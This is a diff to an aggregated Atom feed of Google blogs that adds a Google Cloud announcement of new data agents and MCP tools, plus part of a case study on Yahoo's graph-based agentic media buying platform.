@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
   <id>https://blog.google/</id>
   <title>Google Blogs</title>
-  <updated>2026-06-15T12:19:47.666106+00:00</updated>
+  <updated>2026-06-15T18:29:13.696949+00:00</updated>
   <author>
     <name>Google</name>
   </author>
@@ -10,6 +10,1760 @@
   <link href="https://blog.google/" rel="alternate"/>
   <generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator>
   <subtitle>Combined feed of Google's official blogs (The Keyword, Developers, Android, Chrome, Research, DeepMind, Cloud, and more)</subtitle>
+  <entry>
+    <id>https://cloud.google.com/blog/products/data-analytics/new-data-agents-across-the-agentic-data-cloud/</id>
+    <title>What’s new in data agents: Supercharging your AI workflows</title>
+    <updated>2026-06-15T17:00:00+00:00</updated>
+    <content type="html">&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;The rise of AI agents is fundamentally disrupting applications and analytical systems. Generic AI platforms don't usually have access to the context stored within enterprise databases. This is because traditional data architectures often lack context for agents across the data estate, which can lead to agents being inaccurate. They’re also prone to security gaps due to a lack of granular access controls. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Google’s Agentic Data Cloud is an AI-native system of action that includes both operational and analytical systems. By infusing AI across the entire stack — from custom silicon to frontier Gemini models — we provide a deterministic, template-driven developer framework that allows agents to ground their reasoning in real-time enterprise data with near-100% accuracy, as well as unified governance.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Today, we’re making it easier to develop agents, with a whole host of new data agents and tools: for business analysts within Conversational Analytics; for data scientists, engineers, and database admins with a series of Google-built Data Agents that provide greater automation and intelligence; and finally, for developers, with Data Agent tools that help you better integrate with today’s open agentic ecosystem.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;1. Conversational Analytics&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To support developers building agents using natural language, we’re announcing expanded support for Conversational Analytics across Data Cloud.&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Conversational Analytics in BigQuery&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;a href="https://docs.cloud.google.com/bigquery/docs/conversational-analytics"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;in preview&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, integrates a sophisticated AI reasoning engine directly into BigQuery Studio, helping data and business teams go beyond writing manual SQL, leveraging business context to ground answers using multimodal synthesis and deep-dive research. Agentic workflows, in preview for select customers, automate root-cause analysis, and schedule actions — turning enterprise data into proactive, actionable intelligence. &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;&lt;/div&gt;
+&lt;div class="block-image_full_width"&gt;
+
+
+
+
+
+
+  
+    &lt;div class="article-module h-c-page"&gt;
+      &lt;div class="h-c-grid"&gt;
+  
+
+    &lt;figure class="article-image--large
+      
+      
+        h-c-grid__col
+        h-c-grid__col--6 h-c-grid__col--offset-3
+        
+        
+      "&gt;
+
+      
+      
+        
+        &lt;img alt="1" src="https://storage.googleapis.com/gweb-cloudblog-publish/original_images/1_M5Wjn2O.gif" /&gt;
+        
+        &lt;/a&gt;
+      
+        &lt;figcaption class="article-image__caption "&gt;&lt;p&gt;Create agents for faster data insights with Conversational Analytics in BigQuery&lt;/p&gt;&lt;/figcaption&gt;
+      
+    &lt;/figure&gt;
+
+  
+      &lt;/div&gt;
+    &lt;/div&gt;
+  
+
+
+
+
+&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Conversational Analytics in Lakehouse&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;a href="https://docs.cloud.google.com/lakehouse/docs/conversational-analytics"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;now in preview&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, extends the &lt;/span&gt;&lt;a href="https://docs.cloud.google.com/lakehouse/docs"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Lakehouse&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; unified infrastructure, so users can query distributed data lakes across AWS, Azure, and Google Cloud using natural language. This makes it possible to combine insights across cloud platforms without moving a single byte of data. &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Conversational Analytics in &lt;/strong&gt;&lt;a href="https://docs.cloud.google.com/gemini/data-agents/conversational-analytics/alloydb"&gt;&lt;strong style="text-decoration: underline; vertical-align: baseline;"&gt;AlloyDB&lt;/strong&gt;&lt;/a&gt;&lt;strong style="vertical-align: baseline;"&gt;, &lt;/strong&gt;&lt;a href="https://docs.cloud.google.com/gemini/data-agents/conversational-analytics/spanner"&gt;&lt;strong style="text-decoration: underline; vertical-align: baseline;"&gt;Spanner&lt;/strong&gt;&lt;/a&gt;&lt;strong style="vertical-align: baseline;"&gt;, and &lt;/strong&gt;&lt;a href="https://docs.cloud.google.com/gemini/data-agents/conversational-analytics/sql-postgres"&gt;&lt;strong style="text-decoration: underline; vertical-align: baseline;"&gt;Cloud SQL&lt;/strong&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, now in preview, supports out-of-the-box conversational AI, making data accessible for everyone. AlloyDB, Spanner, and Cloud SQL users can start natural-language conversations with their databases to gain visibility into their real-time operational data and capture analytical insights.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;&lt;/div&gt;
+&lt;div class="block-image_full_width"&gt;
+
+
+
+
+
+
+  
+    &lt;div class="article-module h-c-page"&gt;
+      &lt;div class="h-c-grid"&gt;
+  
+
+    &lt;figure class="article-image--large
+      
+      
+        h-c-grid__col
+        h-c-grid__col--6 h-c-grid__col--offset-3
+        
+        
+      "&gt;
+
+      
+      
+        
+        &lt;img alt="2" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/2_YqI8Fra.max-1000x1000.png" /&gt;
+        
+        &lt;/a&gt;
+      
+        &lt;figcaption class="article-image__caption "&gt;&lt;p&gt;Use Conversational Analytics to get answers from your operational data&lt;/p&gt;&lt;/figcaption&gt;
+      
+    &lt;/figure&gt;
+
+  
+      &lt;/div&gt;
+    &lt;/div&gt;
+  
+
+
+
+
+&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong style="vertical-align: baseline;"&gt;Looker Embedded Conversational Analytics&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/products/business-intelligence/looker-embedded-adds-conversational-analytics"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;now generally available&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, allows you to embed &lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;agents directly into your custom applications and internal workflows via a low-code iframe implementation, making it easier to ship production-ready, conversational AI within any application. Additionally, with the&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;a href="https://docs.cloud.google.com/looker/docs/reference/looker-api/latest/methods/ConversationalAnalytics"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Conversational Analytics API in Looker&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;you can create multi-turn conversational workflows that offer AI-powered recommendations, while also verifying and explaining the underlying SQL query. We are also significantly upgrading Looker’s core&lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt; &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/products/business-intelligence/looker-conversational-analytics-now-ga/?e=48754805"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Conversational Analytics agent&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;which is already GA, with superior reasoning and semantic grounding, helping to eliminate ambiguity.&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/div&gt;
+&lt;div class="block-image_full_width"&gt;
+
+
+
+
+
+
+  
+    &lt;div class="article-module h-c-page"&gt;
+      &lt;div class="h-c-grid"&gt;
+  
+
+    &lt;figure class="article-image--large
+      
+      
+        h-c-grid__col
+        h-c-grid__col--6 h-c-grid__col--offset-3
+        
+        
+      "&gt;
+
+      
+      
+        
+        &lt;img alt="3" src="https://storage.googleapis.com/gweb-cloudblog-publish/original_images/3_vDitSbe.gif" /&gt;
+        
+        &lt;/a&gt;
+      
+        &lt;figcaption class="article-image__caption "&gt;&lt;p&gt;Embed agents directly into your applications for conversational AI&lt;/p&gt;&lt;/figcaption&gt;
+      
+    &lt;/figure&gt;
+
+  
+      &lt;/div&gt;
+    &lt;/div&gt;
+  
+
+
+
+
+&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h3&gt;&lt;strong style="vertical-align: baseline;"&gt;2. New data agents&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To help data professionals move from reactive data management to proactive intelligence, and business analysts better interact with their dashboards, we’re announcing a new set of data agents that bring automation, intelligence, and natural language capabilities into their daily workflows. &lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Data Engineering Agent, &lt;/strong&gt;&lt;a href="https://docs.cloud.google.com/bigquery/docs/data-engineering-agent-pipelines"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;now generally available&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, automates the heavy lifting of building and maintaining data pipelines. It transforms natural language requirements into optimized SQL or Python code for BigQuery and Dataflow, while proactively identifying and fixing pipeline breaks. By suggesting schema improvements and partitioning strategies, it ensures your data foundation is scalable, reliable, and performance-tuned without manual trial and error.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Data Science Agent, &lt;/strong&gt;&lt;a href="https://docs.cloud.google.com/bigquery/docs/colab-data-science-agent"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;now in preview&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, accelerates the path from raw data to production-ready models. It assists data scientists by suggesting relevant features, generating boilerplate notebook code, and automating the technical documentation process. &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Database Observability Agent&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;, in preview with select Cloud SQL, AlloyDB, Spanner, and Bigtable customers, proactively monitors database performance and continuously identifies potential issues before they escalate. It then delivers intelligent recommendations and multi-turn remediation workflows for fast, comprehensive troubleshooting and optimization. It provides performance analytics for the entire database fleet, helping you quickly identify performance optimization opportunities across databases.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong style="vertical-align: baseline;"&gt;Database Onboarding Agent&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;, in preview with select customers, takes the guesswork out of database selection and deployment. By evaluating your stated requirements — from simple use case descriptions, to complex enterprise needs — it recommends the best Google Cloud database and guides you through provisioning.&lt;/span&gt;&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Looker Dashboard Agent&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;a href="https://docs.cloud.google.com/looker/docs/conversational-analytics-looker-data-agents-dashboards"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;now in preview,&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; enables conversational interaction with data within dashboards. Users can ask natural language questions and receive context-aware answers within the dashboard. This feature also provides AI-generated summaries that highlight key takeaways and insights from the dashboard. &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong style="vertical-align: baseline;"&gt;Conversational Analytics in Gemini Enterprise, &lt;/strong&gt;&lt;a href="https://docs.cloud.google.com/bigquery/docs/create-data-agents#publish-agent-gemini-enterprise"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;now in preview&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; for Looker, BigQuery, and Lakehouse, brings governed intelligence built by data practitioners directly to business leaders. It serves as a "front door" to the Google Data Cloud, allowing business users to consume agents built in BigQuery, Looker, or Lakehouse without needing to access technical consoles. By publishing these agents from Google Data to Gemini Enterprise, organizations provide a single, grounded interface for precision data exploration and immediate answers to the business users. &lt;/span&gt;&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Data Insights Agent&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;a href="https://docs.cloud.google.com/gemini/enterprise/docs/data-agent"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;now in preview&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, provides unified insights into your data assets in Gemini Enterprise, by simultaneously querying structured sources like BigQuery and Snowflake alongside unstructured data like meeting notes and public web info. It functions as a quick-response engine for everyday business users, synthesizing information across the Workspace ecosystem (Docs, Sheets, Drive) and third-party apps like Jira and HubSpot. The agent features rich, interactive visualizations and learns continuously to align with user preferences over time. &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Deep Research Agent&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;a href="https://ai.google.dev/gemini-api/docs/deep-research" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;now in preview&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, uses the Knowledge Catalog to solve high-stakes, multi-layered business problems. It moves beyond simple search to build comprehensive research plans that synthesize intelligence from internal documents, BigQuery tables, and the public web. The result is a detailed report with dynamic visualizations and verifiable citations, that respect enterprise privacy and user permissions all the while. &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;&lt;span style="vertical-align: baseline;"&gt;3. Tools for data agents &lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Open-source standards for agentic development provide developers building AI applications and custom agents with a unified framework to access data and tools consistently and securely. Today, we are announcing the following tools to help ground your agentic development initiatives:&lt;/span&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Data Agent Kit: &lt;/strong&gt;&lt;a href="https://docs.cloud.google.com/data-cloud-extension"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;now in preview&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, provides a standardized suite of skills and tools directly within preferred developer environments (IDE/CLI), empowering data practitioners to discover, transform, and action data at scale using the prescriptive guidance from the Agentic Data Cloud capabilities.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Managed MCP Servers for Databases, &lt;/strong&gt;&lt;a href="https://docs.cloud.google.com/mcp/manage-mcp-servers"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;now generally available&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; for AlloyDB, Spanner, Cloud SQL, Bigtable, and Firestore, fully manages the infrastructure required to connect AI models securely to your data, so you don’t have to host, secure, or scale MCP servers yourself. Now, developers can provide their agents with up-to-date context from across our database portfolio, so that your AI models can reason and act upon your most up-to-date enterprise data.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Managed MCP Server for Looker&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;, &lt;/span&gt;&lt;a href="https://docs.cloud.google.com/looker/docs/mcp"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;now in preview&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, allows any MCP client or agent platform to query Looker's semantic models, extending governed BI insights across third-party applications.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;&lt;/div&gt;
+&lt;div class="block-image_full_width"&gt;
+
+
+
+
+
+
+  
+    &lt;div class="article-module h-c-page"&gt;
+      &lt;div class="h-c-grid"&gt;
+  
+
+    &lt;figure class="article-image--large
+      
+      
+        h-c-grid__col
+        h-c-grid__col--6 h-c-grid__col--offset-3
+        
+        
+      "&gt;
+
+      
+      
+        
+        &lt;img alt="4" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/4_rcQ0IiI.max-1000x1000.png" /&gt;
+        
+        &lt;/a&gt;
+      
+        &lt;figcaption class="article-image__caption "&gt;&lt;p&gt;Access Looker semantic models through Managed MCP Server&lt;/p&gt;&lt;/figcaption&gt;
+      
+    &lt;/figure&gt;
+
+  
+      &lt;/div&gt;
+    &lt;/div&gt;
+  
+
+
+
+
+&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;ul&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;MCP Toolbox for Databases 1.0, &lt;/strong&gt;&lt;a href="https://github.com/googleapis/mcp-toolbox" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;now generally available&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, has achieved a major stability milestone, giving you the confidence to build production applications. We also overhauled the documentation, making the platform significantly more approachable for both human developers and autonomous agents.&lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;QueryData for &lt;/strong&gt;&lt;a href="https://docs.cloud.google.com/sql/docs/postgres/data-agent-overview"&gt;&lt;strong style="text-decoration: underline; vertical-align: baseline;"&gt;Cloud SQL&lt;/strong&gt;&lt;/a&gt;&lt;strong style="vertical-align: baseline;"&gt;, &lt;/strong&gt;&lt;a href="https://docs.cloud.google.com/alloydb/docs/ai/data-agent-overview"&gt;&lt;strong style="text-decoration: underline; vertical-align: baseline;"&gt;AlloyDB&lt;/strong&gt;&lt;/a&gt;&lt;strong style="vertical-align: baseline;"&gt;, and &lt;/strong&gt;&lt;a href="https://docs.cloud.google.com/spanner/docs/data-agent-overview"&gt;&lt;strong style="text-decoration: underline; vertical-align: baseline;"&gt;Spanner&lt;/strong&gt;&lt;/a&gt;&lt;strong style="vertical-align: baseline;"&gt;,&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt; now in preview, turns natural language questions into database queries. It’s built natively into these databases, and provides near-100% accuracy for natural language to SQL conversions through metadata, query examples, and evals. &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li style="vertical-align: baseline;"&gt;
+&lt;p&gt;&lt;strong style="vertical-align: baseline;"&gt;Universal Commerce Protocol (UCP) Analytics powered by BigQuery&lt;/strong&gt;&lt;span style="vertical-align: baseline;"&gt;, now in preview, enables merchants and developers to stream real-time events from UCP directly into BigQuery (see &lt;/span&gt;&lt;a href="https://github.com/GoogleCloudPlatform/data-agent-kit/tree/main/ucp-analytics" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;sample&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;). This &lt;/span&gt;&lt;a href="https://developers.google.com/merchant/ucp/guides/bq-storage" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;integration&lt;/span&gt;&lt;/a&gt; &lt;span style="vertical-align: baseline;"&gt;provides out-of-the-box observability for agentic commerce, allowing teams to monitor conversion funnels, track automated checkout performance, and identify system errors. By standardizing these metrics within BigQuery, businesses can bridge the gap between AI-driven transactions and existing business intelligence workflows. &lt;/span&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Details on how to access the new agents and tools can be found from each of the documentation links on this page. Data agents are also available through Gemini Enterprise and the Google Cloud console. &lt;/span&gt;&lt;/p&gt;&lt;/div&gt;</content>
+    <link href="https://cloud.google.com/blog/products/data-analytics/new-data-agents-across-the-agentic-data-cloud/"/>
+    <category term="Google Cloud"/>
+    <published>2026-06-15T17:00:00+00:00</published>
+  </entry>
+  <entry>
+    <id>https://cloud.google.com/blog/products/databases/graph-technologies-underpin-yahoo-system-of-action/</id>
+    <title>Architecting a trusted agentic platform with graph technologies: A Yahoo case study</title>
+    <updated>2026-06-15T16:00:00+00:00</updated>
+    <content type="html">&lt;div class="block-paragraph_advanced"&gt;&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;As enterprises adopt agentic AI, they need to shift from reactive systems of intelligence to proactive &lt;/span&gt;&lt;a href="https://cloud.google.com/transform/shift-system-of-action-architecting-the-agentic-data-cloud-ai?e=48754805"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;systems of action&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; to equip the agents they’re building with the context and performance they need, plus regulator-grade accountability, where every decision is explainable and auditable. &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;At Google Cloud Next ‘26, we discuss how our &lt;/span&gt;&lt;a href="https://cloud.google.com/blog/products/data-analytics/whats-new-in-the-agentic-data-cloud?e=48754805"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Agentic Data Cloud enables a system of action&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, and Yahoo’s digital media buying platform is a compelling example of this vision. Yahoo partnered with Google Cloud to build its Seller Agent digital media buying platform using Google Data Cloud graph technologies. Seller Agent condenses multi-week manual processes into fully governed, live campaigns that can be executed in just seconds. Ultimately, this agentic platform serves as a powerful blueprint for multiple industries, demonstrating that autonomous systems can operate at remarkable speed while remaining strictly accountable.&lt;/span&gt;&lt;/p&gt;
+&lt;p style="padding-left: 40px;"&gt;&lt;span style="font-style: italic; vertical-align: baseline;"&gt;"Yahoo's mission is to be a trusted guide through the digital world. In partnership with Google Cloud, we're extending that promise to advertisers: agentic media buying that's fast, transparent, effective, and built to be trusted." &lt;/span&gt;&lt;span style="vertical-align: baseline;"&gt;- Gabriel DeWitt, Head of Monetization, Yahoo&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;In this blog, we explore the shift toward agentic AI, examine how Yahoo’s Seller Agent architecture solves for speed and trust in media buying, and show you how to apply this graph-based pattern to build trusted systems of action in your own organization.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;strong style="vertical-align: baseline;"&gt;Case study: agentic media buying&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;For years, complex, high-value workflows—like premium digital advertising campaigns—have required weeks of human handoffs, fragmented spreadsheets, and manual analysis. Yahoo recognized that agentic AI could collapse this timeline, allowing agents to plan and execute campaigns in mere seconds. This leap from manual to autonomous execution represents a massive opportunity to reclaim operational efficiency and ensure more of every dollar reaches measurable outcomes.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;But simply dropping LLMs into a high-stakes workflow does not solve the problem; an agent attempting to negotiate contracts or ad placements without a deterministic understanding of real-time inventory, pricing rules, and business constraints is prone to hallucinate — potentially resulting in disastrous deals. A trusted agentic platform requires a definitive, real-time source of truth, ensuring it acts on hard facts rather than statistical guesses.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Furthermore, speed and factual grounding are only half the equation. The moment an AI agent starts moving real budgets, it faces scrutiny from regulators who demand instant answers to why specific decisions were made or which policies were applied. Digging through raw system logs after the fact is the wrong control surface for autonomous execution. Real-world systems of action require regulator-grade governance and auditability built directly into the workflow, not bolted on as an afterthought.&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;strong style="vertical-align: baseline;"&gt;The architecture of a trusted system of action&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Yahoo's mission has always been to be a trusted guide through the digital world. Agentic media buying extends that promise to advertisers, agencies, publishers, and regulators who entrust Yahoo with their budgets — and expect real accountability. The issue was automating campaign execution in a way that was explainable, governable, and auditable.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;To meet this challenge, Yahoo built its Seller Agent as a multi-agent system running on Google Cloud. Buyer requests enter through a planning supervisor agent running on &lt;/span&gt;&lt;a href="https://cloud.google.com/kubernetes-engine"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Google Kubernetes Engine&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; (GKE) and orchestrated with &lt;/span&gt;&lt;a href="https://docs.cloud.google.com/gemini-enterprise-agent-platform/build/adk"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Google's Agent Development Kit&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; (ADK). The supervisor decomposes each request into specialized tasks including inventory discovery, audience matching, forecasting, pricing analysis, package recommendation, governance review, and execution. Agents coordinate through the open &lt;/span&gt;&lt;a href="https://github.com/a2aproject/A2A" rel="noopener" target="_blank"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Agent2Agent&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; (A2A) protocol, while &lt;/span&gt;&lt;a href="https://docs.cloud.google.com/gemini-enterprise-agent-platform"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Gemini Enterprise Agent Platform&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt; hosts models for embeddings, forecasting, and graph learnings.&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;But the true breakthrough — what makes autonomous execution both fast and fully transparent — is the platform’s dual-graph foundation. The platform is anchored by two specialized graph systems with an intentional separation of duties: a knowledge graph that’s optimized for acting, and a second context graph for remembering and learning.&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;
+&lt;div class="block-image_full_width"&gt;
+
+
+
+
+
+
+  
+    &lt;div class="article-module h-c-page"&gt;
+      &lt;div class="h-c-grid"&gt;
+  
+
+    &lt;figure class="article-image--large
+      
+      
+        h-c-grid__col
+        h-c-grid__col--6 h-c-grid__col--offset-3
+        
+        
+      "&gt;
+
+      
+      
+        
+        &lt;img alt="[0] trusted_system_of_action" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/0_trusted_system_of_action.max-1000x1000.png" /&gt;
+        
+        &lt;/a&gt;
+      
+    &lt;/figure&gt;
+
+  
+      &lt;/div&gt;
+    &lt;/div&gt;
+  
+
+
+
+
+&lt;/div&gt;
+&lt;div class="block-paragraph_advanced"&gt;&lt;h4&gt;&lt;strong style="vertical-align: baseline;"&gt;The knowledge graph: Grounding agents in business reality&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span style="vertical-align: baseline;"&gt;Powered by &lt;/span&gt;&lt;a href="https://cloud.google.com/products/spanner/graph?e=48754805"&gt;&lt;span style="text-decoration: underline; vertical-align: baseline;"&gt;Spanner Graph&lt;/span&gt;&lt;/a&gt;&lt;span style="vertical-align: baseline;"&gt;, Yahoo’s knowledge graph represents its monetization business as a connected operational model, grounding every agent decision in business reality. It models advertising products, placements, audience segments, inventory, contracts, and governance controls as first-class entities and relationships. Crucially, policies live directly within the graph as versioned relationships rather than being buried in application logic. This design allows the system to evaluate products, contractual obligations, consent requirements, and regulatory constraints together in a single, unified graph traversal.&lt;/span&gt;&lt;/p&gt;
